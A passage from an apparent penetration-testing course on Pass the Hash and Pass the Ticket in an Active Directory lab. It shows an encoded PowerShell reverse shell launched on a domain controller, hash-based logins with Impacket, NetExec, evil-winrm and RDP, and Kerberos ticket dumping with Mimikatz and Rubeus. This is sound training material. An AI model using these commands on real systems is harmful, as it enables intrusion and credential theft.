PS c:<span class="hljs-string">\tools\Invoke-TheHash&gt;</span> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash <span class="hljs-number">64</span>F12CDDAA88057E06A81B54E73B949B -Command <span class="hljs-string">"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="</span>

[+] Command executed <span class="hljs-keyword">with</span> process id <span class="hljs-number">520</span> <span class="hljs-literal">on</span> DC01
</code></pre>
<p>The result is a reverse shell connection from the DC01 host (172.16.1.10).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/pth_invoke_the_hash.jpg" alt="PowerShell and command prompt showing Invoke-TheHash execution with network connection details and whoami command output."></p>
<h3 id="pass-the-hash-with-impacket-linux-">Pass the Hash with Impacket (Linux)</h3>
<p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> has several tools we can use for different operations such as <code>Command Execution</code> and <code>Credential Dumping</code>, <code>Enumeration</code>, etc. For this example, we will perform command execution on the target machine using <code>PsExec</code>.</p>
<p><strong>Pass the Hash with Impacket PsExec</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span>@htb[/htb]$ impacket-psexec administrator@<span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.126</span> -hashes :<span class="hljs-number">30</span><span class="hljs-symbol">B3783CE2ABF1AF70F77D0660CF3453</span>

<span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.9</span><span class="hljs-number">.22</span> - <span class="hljs-symbol">Copyright</span> <span class="hljs-number">2020</span> <span class="hljs-symbol">SecureAuth</span> <span class="hljs-symbol">Corporation</span>

[*] <span class="hljs-symbol">Requesting</span> shares on <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.126</span>.....
[*] <span class="hljs-symbol">Found</span> writable share <span class="hljs-symbol">ADMIN</span>$
[*] <span class="hljs-symbol">Uploading</span> file <span class="hljs-symbol">SLUBMRXK</span>.exe
[*] <span class="hljs-symbol">Opening</span> <span class="hljs-symbol">SVCManager</span> on <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.126</span>.....
[*] <span class="hljs-symbol">Creating</span> service <span class="hljs-symbol">AdzX</span> on <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.126</span>.....
[*] <span class="hljs-symbol">Starting</span> service <span class="hljs-symbol">AdzX</span>.....
[!] <span class="hljs-symbol">Press</span> help for extra shell commands
<span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Windows</span> [<span class="hljs-symbol">Version</span> <span class="hljs-number">10.0</span><span class="hljs-number">.19044</span><span class="hljs-number">.1415</span>]
(c) <span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Corporation</span>. <span class="hljs-symbol">All</span> rights reserved.

<span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32&gt;
</code></pre>
<p>There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:</p>
<ul>
<li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">impacket-wmiexec</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">impacket-atexec</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">impacket-smbexec</a></li>
</ul>
<h3 id="pass-the-hash-with-netexec-linux-">Pass the Hash with NetExec (Linux)</h3>
<p><a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use NetExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called &quot;Password Spraying&quot; and is covered in-depth in the <code>Active Directory Enumeration &amp; Attacks</code> module. Note that this method can lock out domain accounts, so keep the target domain&#39;s account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.</p>
<p><strong>Pass the Hash with NetExec</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-selector-tag">htb</span><span class="hljs-selector-attr">[/htb]</span># <span class="hljs-selector-tag">netexec</span> <span class="hljs-selector-tag">smb</span> <span class="hljs-selector-tag">172</span><span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span>/<span class="hljs-selector-tag">24</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">Administrator</span> <span class="hljs-selector-tag">-d</span> . <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">30B3783CE2ABF1AF70F77D0660CF3453</span>

<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">172</span><span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.10</span>   <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">DC01</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">17763</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:DC01) (<span class="hljs-attribute">domain</span>:.) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)
<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">172</span><span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.10</span>   <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">DC01</span>             <span class="hljs-selector-attr">[-]</span> .\<span class="hljs-selector-tag">Administrator</span><span class="hljs-selector-pseudo">:30B3783CE2ABF1AF70F77D0660CF3453</span> <span class="hljs-selector-tag">STATUS_LOGON_FAILURE</span> 
<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">172</span><span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.5</span>    <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">MS01</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">19041</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:MS01) (<span class="hljs-attribute">domain</span>:.) (<span class="hljs-attribute">signing</span>:False) (<span class="hljs-attribute">SMBv1</span>:False)
<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">172</span><span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.5</span>    <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">MS01</span>             <span class="hljs-selector-attr">[+]</span> .\<span class="hljs-selector-tag">Administrator</span> <span class="hljs-selector-tag">30B3783CE2ABF1AF70F77D0660CF3453</span> (Pwn3d!)
</code></pre>
<p>If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add <code>--local-auth</code> to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see <code>Pwn3d!</code>, it means that the user is a local administrator on the target computer. We can use the option <code>-x</code> to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the <a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">Local Administrator Password Solution (LAPS)</a>, which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.</p>
<p><strong>NetExec - Command Execution</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-selector-tag">htb</span><span class="hljs-selector-attr">[/htb]</span># <span class="hljs-selector-tag">netexec</span> <span class="hljs-selector-tag">smb</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.126</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">Administrator</span> <span class="hljs-selector-tag">-d</span> . <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">30B3783CE2ABF1AF70F77D0660CF3453</span> <span class="hljs-selector-tag">-x</span> <span class="hljs-selector-tag">whoami</span>

<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.126</span>  <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">MS01</span>            <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span> <span class="hljs-selector-tag">Enterprise</span> <span class="hljs-selector-tag">10240</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:MS01) (<span class="hljs-attribute">domain</span>:.) (<span class="hljs-attribute">signing</span>:False) (<span class="hljs-attribute">SMBv1</span>:True)
<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.126</span>  <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">MS01</span>            <span class="hljs-selector-attr">[+]</span> .\<span class="hljs-selector-tag">Administrator</span> <span class="hljs-selector-tag">30B3783CE2ABF1AF70F77D0660CF3453</span> (Pwn3d!)
<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.126</span>  <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">MS01</span>            <span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Executed</span> <span class="hljs-selector-tag">command</span> 
<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.126</span>  <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">MS01</span>            <span class="hljs-selector-tag">MS01</span>\<span class="hljs-selector-tag">administrator</span>
</code></pre>
<p>Review the <a href="https://www.netexec.wiki/">NetExec documentation Wiki</a> to learn more about the tool&#39;s extensive features.</p>
<h3 id="pass-the-hash-with-evil-winrm-linux-">Pass the Hash with evil-winrm (Linux)</h3>
<p><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don&#39;t have administrative rights, we can use this alternative protocol to connect to the target machine.</p>
<p><strong>Pass the Hash with evil-winrm</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ evil-winrm -i <span class="hljs-number">10.129</span>.<span class="hljs-number">201.126</span> -u Administrator -H <span class="hljs-number">30</span>B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.<span class="hljs-number">3</span>

Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint

*Evil-WinRM* PS C:<span class="hljs-string">\Users\Administrator\Documents&gt;</span>
</code></pre>
<p>Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb</p>
<h3 id="pass-the-hash-with-rdp-linux-">Pass the Hash with RDP (Linux)</h3>
<p>We can perform an RDP PtH attack to gain GUI access to the target system using tools like <code>xfreerdp</code>.</p>
<p>There are a few caveats to this attack:</p>
<ul>
<li><code>Restricted Admin Mode</code>, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/rdp_session-4.png" alt="Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions."></p>
<p>This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code> with the value of 0. It can be done using the following command:</p>
<p><strong>Enable Restricted Admin Mode to allow PtH</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-cmd-session">c:<span class="hljs-symbol">\t</span>ools&gt; reg add HKLM<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/rdp_session-5.png" alt="Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0."></p>
<p>Once the registry key is added, we can use <code>xfreerdp</code> with the option <code>/pth</code> to gain RDP access:</p>
<p><strong>Pass the Hash using RDP</strong></p>
<p>&#x20; Pass the Hash (PtH)</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[<span class="hljs-string">15:38:26:999</span>] [<span class="hljs-string">94965:94966</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_connect:freerdp_</span>set<span class="hljs-emphasis">_last_</span>error_ex resetting error state
[<span class="hljs-string">15:38:26:999</span>] [<span class="hljs-string">94965:94966</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpdr
...snip...
[<span class="hljs-string">15:38:26:352</span>] [<span class="hljs-string">94965:94966</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[<span class="hljs-string">15:38:26:352</span>] [<span class="hljs-string">94965:94966</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[<span class="hljs-string">15:38:26:352</span>] [<span class="hljs-string">94965:94966</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/rdp_session_new.jpg" alt="Windows desktop accessed via FreeRDP with Parrot Terminal showing command execution and desktop icons for Recycle Bin, Invoke-TheHash, and mimikatz."></p>
<h3 id="uac-limits-pass-the-hash-for-local-accounts">UAC limits Pass the Hash for local accounts</h3>
<p>UAC (User Account Control) limits local users&#39; ability to perform remote administration operations. When the registry key <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> is set to 0, it means that the built-in local admin account (RID-500, &quot;Administrator&quot;) is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.</p>
<p>Note: There is one exception, if the registry key <code>FilterAdministratorToken</code> (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.</p>
<p>These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder&#39;s blog post <a href="https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a>.</p>
<h3 id="next-steps">Next steps</h3>
<p>In this section, we learned how to use the NTLM (RC4-HMAC) hash of a user&#39;s password to perform a Pass the Hash (PtH) attack and move laterally in a target network, but that&#39;s not the only way we can move laterally. In the next section, we will learn how to abuse the Kerberos protocol to move laterally and authenticate as different users.</p>
<hr>
<h2 id="pass-the-ticket-ptt-from-windows">Pass the Ticket (PtT) from Windows</h2>
<p>Another method for moving laterally in an Active Directory environment is called a <a href="https://attack.mitre.org/techniques/T1550/003/">Pass the Ticket (PtT) attack</a>. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We&#39;ll cover several ways to perform a PtT attack from Windows and Linux. In this section, we&#39;ll focus on Windows attacks, and in the following section, we&#39;ll cover attacks from Linux.</p>
<h3 id="kerberos-protocol-refresher">Kerberos protocol refresher</h3>
<p>The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.</p>
<ul>
<li>The <code>Ticket Granting Ticket</code> (<code>TGT</code>) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or <code>TGS</code>.</li>
<li>The <code>Ticket Granting Service</code> (<code>TGS</code>) is requested by users who want to use a service. These tickets allow services to verify the user&#39;s identity.</li>
</ul>
<p>When a user requests a <code>TGT</code>, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user&#39;s identity (because the domain knows the user&#39;s password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.</p>
<p>If the user wants to connect to an MSSQL database, it will request a <code>Ticket Granting Service</code> (<code>TGS</code>) to the <code>Key Distribution Center</code> (<code>KDC</code>), presenting its <code>Ticket Granting Ticket</code> (<code>TGT</code>). Then it will give the TGS to the MSSQL database server for authentication.</p>
<p>It&#39;s recommended to take a look at the <a href="https://academy.hackthebox.com/module/74/section/701">Kerberos, DNS, LDAP, MSRPC</a> section in the module <a href="https://academy.hackthebox.com/module/details/74">Introduction to Active Directory</a> for a high-level overview of how this protocol works.</p>
<h3 id="pass-the-ticket-ptt-attack">Pass the Ticket (PtT) attack</h3>
<p>We need a valid Kerberos ticket to perform a <code>Pass the Ticket (PtT)</code> attack. It can be:</p>
<ul>
<li>Service Ticket (TGS) to allow access to a particular resource.</li>
<li>Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.</li>
</ul>
<p>Before we perform a <code>Pass the Ticket (PtT)</code> attack, let&#39;s see some methods to get a ticket using <code>Mimikatz</code> and <code>Rubeus</code>.</p>
<h3 id="scenario">Scenario</h3>
<p>Let&#39;s imagine we are on a pentest, and we manage to phish a user and gain access to the user&#39;s computer. We found a way to obtain administrative privileges on this computer and are working with local administrator rights. Let&#39;s explore several ways we can manage to get access tickets on this computer and how we can create new tickets.</p>
<h3 id="harvesting-kerberos-tickets-from-windows">Harvesting Kerberos tickets from Windows</h3>
<p>On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.</p>
<p>We can harvest all tickets from a system using the <code>Mimikatz</code> module <code>sekurlsa::tickets /export</code>. The result is a list of files with the extension <code>.kirbi</code>, which contain the tickets.</p>
<p><strong>Mimikatz - Export tickets</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">c:\tools&gt; mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Aug  <span class="hljs-number">6</span> <span class="hljs-number">2020</span> <span class="hljs-number">14</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '<span class="hljs-number">20</span>' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; <span class="hljs-number">329278</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0005063</span>e)
Session           : <span class="hljs-type">Network</span> from <span class="hljs-number">0</span>
User Name         : <span class="hljs-type">DC01</span>$
Domain            : <span class="hljs-type">HTB</span>
Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)
Logon Time        : 7/12/2022 9:39:55 <span class="hljs-type">AM</span>
SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span>

         * Username : <span class="hljs-type">DC01</span>$
         * Domain   : <span class="hljs-type">inlanefreight.htb</span>
         * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)

        Group <span class="hljs-number">0</span> - Ticket Granting Service

        Group <span class="hljs-number">1</span> - Client Ticket ?
         [<span class="hljs-number">00000000</span>]
           Start/<span class="hljs-keyword">End</span>/MaxRenew: <span class="hljs-number">7</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">39</span>:<span class="hljs-number">55</span> AM ; <span class="hljs-number">7</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">39</span>:<span class="hljs-number">54</span> PM ;
           Service Name (<span class="hljs-number">02</span>) : <span class="hljs-type">LDAP</span> ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
           Target Name  (<span class="hljs-comment">--) : @ inlanefreight.htb</span>
           Client Name  (<span class="hljs-number">01</span>) : <span class="hljs-type">DC01</span>$ ; @ inlanefreight.htb
           Flags <span class="hljs-number">40</span>a50000    : <span class="hljs-type">name_canonicalize</span> ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0<span class="hljs-type">x00000012</span> - aes256_hmac
             <span class="hljs-number">31</span>cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
           Ticket            : 0<span class="hljs-type">x00000012</span> - aes256_hmac       ; kvno = <span class="hljs-number">5</span>        [...]
           * Saved to file [<span class="hljs-number">0</span>;<span class="hljs-number">5063</span>e]-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>-<span class="hljs-number">40</span>a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group <span class="hljs-number">2</span> - Ticket Granting Ticket

mimikatz # <span class="hljs-keyword">exit</span>
Bye!

c:\tools&gt; dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
<span class="hljs-comment">----                -------------         ------ ----</span>

&lt;SNIP&gt;

-a<span class="hljs-comment">----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi</span>
-a<span class="hljs-comment">----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi</span>
</code></pre>
<p>The tickets that end with <code>$</code> correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user&#39;s name, followed by an <code>@</code> that separates the service name and the domain, for example: <code>[randomvalue]-username@service-domain.local.kirbi</code>.</p>
<p>Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.</p>
<p>We can also export tickets using <code>Rubeus</code> and the option <code>dump</code>. This option can be used to dump all tickets (if running as a local administrator). <code>Rubeus dump</code>, instead of giving us a file, will print the ticket encoded in Base64 format. We are adding the option <code>/nowrap</code> for easier copy-paste.</p>
<p>Note: At the time of writing, using <code>Mimikatz version 2.2.0 20220919</code>, if we run <code>sekurlsa::ekeys</code> it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in Base64 format.</p>
<p><strong>Rubeus - Export tickets</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">c:</span>\tools&gt; Rubeus.exe dump /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  <span class="hljs-regexp">/| | | |  _ \| ___ | | | |/</span>___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____<span class="hljs-regexp">/|____/</span>|_____)____<span class="hljs-regexp">/(___/</span>

  v1<span class="hljs-number">.5</span><span class="hljs-number">.0</span>
<span class="hljs-symbol">

Action:</span> Dump Kerberos Ticket Data (All Users)

[*] Current <span class="hljs-string">LUID    :</span> <span class="hljs-number">0x6c680</span>
    <span class="hljs-string">ServiceName           :</span>  krbtgt/inlanefreight.htb
    <span class="hljs-string">ServiceRealm          :</span>  inlanefreight.htb
    <span class="hljs-string">UserName              :</span>  DC01$
    <span class="hljs-string">UserRealm             :</span>  inlanefreight.htb
    <span class="hljs-string">StartTime             :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">39</span>:<span class="hljs-number">54</span> AM
    <span class="hljs-string">EndTime               :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">39</span>:<span class="hljs-number">54</span> PM
    <span class="hljs-string">RenewTill             :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/19/</span><span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">39</span>:<span class="hljs-number">54</span> AM
    <span class="hljs-string">Flags                 :</span>  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    <span class="hljs-string">KeyType               :</span>  aes256_cts_hmac_sha1
    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
    <span class="hljs-string">Base64EncodedTicket   :</span>

